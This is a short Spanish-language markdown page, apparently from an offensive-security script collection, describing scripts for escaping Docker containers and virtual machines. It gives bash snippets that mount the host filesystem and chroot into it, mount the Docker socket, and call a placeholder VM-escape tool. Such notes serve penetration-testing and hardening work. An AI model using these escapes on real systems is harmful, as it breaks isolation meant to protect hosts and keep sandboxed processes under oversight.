### **Scripts/Breakout_Scripts/breakout_scripts.md**

# Breakout Scripts

## Descripción

`Breakout Scripts` son scripts diseñados para escapar de entornos aislados como contenedores Docker o máquinas virtuales. Facilitan la explotación de vulnerabilidades en la configuración para obtener acceso al sistema host.

## Uso

Los scripts se ejecutan dentro del entorno aislado para intentar superar las restricciones impuestas.

### Ejemplos principales

- **Escapar de un contenedor Docker con privilegios elevados:**

  ```bash
  #!/bin/bash
  # Script para escalar privilegios desde un contenedor Docker
  docker run -v /:/host alpine chroot /host /bin/sh
  ```

- **Escapar de una máquina virtual mediante exploits conocidos:**

  ```bash
  #!/bin/bash
  # Uso de exploit local para VM escape
  exploit_vm_escape_tool --target vm_identifier
  ```

- **Explotar configuraciones inseguras de Docker:**

  ```bash
  #!/bin/bash
  # Montar el socket de Docker y obtener acceso al host
  docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
  ```
